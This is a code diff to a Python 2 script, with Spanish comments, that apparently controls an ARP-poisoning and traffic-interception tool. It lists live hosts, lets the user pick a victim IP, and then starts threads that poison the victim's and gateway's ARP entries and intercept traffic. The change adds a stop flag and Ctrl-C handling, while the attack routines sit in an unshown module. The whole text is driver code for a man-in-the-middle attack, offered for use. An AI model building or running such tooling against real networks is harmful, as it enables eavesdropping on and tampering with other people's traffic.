@@ -15,7 +15,8 @@ def usage():
 """
 CONFIGURACIOES
 """
-signal.signal(signal.SIGINT, snake_utils.handler)
+stop_threads = False
+
 if len(sys.argv) != 4:
     usage()
 else :
@@ -61,22 +62,26 @@ if len(hosts_live) != 0 :
             hosts_live = snake_utils.hosts_discovery(target_subnet)
             os.system("clear")#limpiar pantalla
         else:
-            if user_response == 88 :
-                scan_semaphore = False
-                target_host_poison = hosts_live[ input("Poison [*]IP -> ") ]
-                target_ip_poison = target_host_poison[0]
-                target_mac_poison = target_host_poison[1]
-                #start aro poisioning atack
-                poison_thread = threading.Thread(target=snake_utils.poisoner, args=(gateway_ip, gateway_mac,target_ip_poison,target_mac_poison))
-                poison_thread.start()
-                time.sleep(2)
-                #start intercepter
-                intercepter_thread = threading.Thread(target=snake_utils.intercepter)
-                intercepter_thread.start()
-            else :
-                print "[!] No valid option"
-                time.sleep(2)
-                os.system("clear")#limpiar pantalla
+            try:
+                if user_response == 88 :
+                    scan_semaphore = False
+                    target_host_poison = hosts_live[ input("Poison [*]IP -> ") ]
+                    target_ip_poison = target_host_poison[0]
+                    target_mac_poison = target_host_poison[1]
+                    #start arp poisioning atack
+                    poison_thread = threading.Thread(target=snake_utils.poisoner, args=(gateway_ip, gateway_mac,target_ip_poison,target_mac_poison, lambda : stop_threads))
+                    poison_thread.start()
+                    time.sleep(2)
+                    #start intercepter
+                    snake_utils.intercepter(lambda : stop_threads)
+                    
+                else :
+                    print "[!] No valid option"
+                    time.sleep(2)
+                    os.system("clear")#limpiar pantalla
+            except KeyboardInterrupt:
+                stop_threads = True
+                poison_thread.join()
 else :
     print "[!!!] No host discovered :C"
     sys.exit(0)
